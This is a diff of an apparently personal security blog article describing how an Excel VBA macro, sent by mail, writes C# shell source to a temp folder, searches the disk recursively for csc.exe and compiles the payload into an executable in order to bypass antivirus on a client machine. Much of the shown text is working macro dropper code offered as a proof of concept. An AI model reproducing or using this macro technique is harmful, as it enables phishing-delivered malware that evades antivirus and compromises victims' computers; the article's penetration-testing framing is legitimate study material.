@@ -1,7 +1,8 @@
 # InfoSec Chronicles from Noobland
 ## Chapter 0: Abuse Excel VBA macro
-###### 21/07/20 ver 1.0
+###### 21/07/20 ver 1.2
 In this article I will illustrate how to execute a payload loaded from a VBA macro script embedded in an Excel xlsm file.<br>
+I did not implement any obfuscation\encrypting technique, this has to be consider as a POC. Beware that using well known tools will rise AV warning in most cases,
 The requirement was to bypass a note AV software installed on a client machine. Following the events:
 * A mail with the Excel file was sent to the client, here I play the role of the victim<br>
 ![Screenshot](screen/mail.png)
@@ -36,7 +37,54 @@ I used a file system object to write the source code of the shell to the *user t
     shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)
     wSo = CreateObject(shellObj)
 ```
-* Now we need to find a compiler on the system, I searched for the *csc.exe* since the .Net FW is installed almost on every newer Win OS and my payload is written in C#. Assuming that the full path of csc.exe is stored in the CSC variable the following will compile the source file:
+* Now we need to find a compiler on the system, I searched for the *csc.exe* since the .Net FW is installed almost on every newer Win OS and my payload is written in C#. Follows the recursive function used to accomplish the task
+```
+Sub FindCSC(ByVal folderPath As String)
+
+Dim fileName As String
+Dim fullFilePath As String
+Dim numFolders As Long
+Dim folders() As String
+Dim i As Long
+
+If Right(folderPath, 1) <> "\" Then folderPath = folderPath & "\"
+fileName = Dir(folderPath & "*.*", vbDirectory)
+
+While Len(fileName) <> 0
+
+    If Left(fileName, 1) <> "." Then
+ 
+        fullFilePath = folderPath & fileName
+ 
+        If (GetAttr(fullFilePath) And vbDirectory) = vbDirectory Then
+            ReDim Preserve folders(0 To numFolders) As String
+            folders(numFolders) = fullFilePath
+            numFolders = numFolders + 1
+        Else
+            If fileName = "csc.exe" Then
+                CSC = folderPath & fileName 'found compiler
+                Exit Sub
+            End If
+        End If
+ 
+    End If
+ 
+    fileName = Dir()
+
+Wend
+
+For i = 0 To numFolders - 1
+    'if found we exit
+    If CSC <> "" Then
+        Exit For
+    End If
+    FindCSC folders(i)
+ 
+Next i
+
+End Sub
+```
+* Now assuming that the full path of csc.exe is stored in the CSC variable the following will compile the source file:
 ```
     Dim exePath As String
     exePath = """" & path & "\mal.exe" & """"
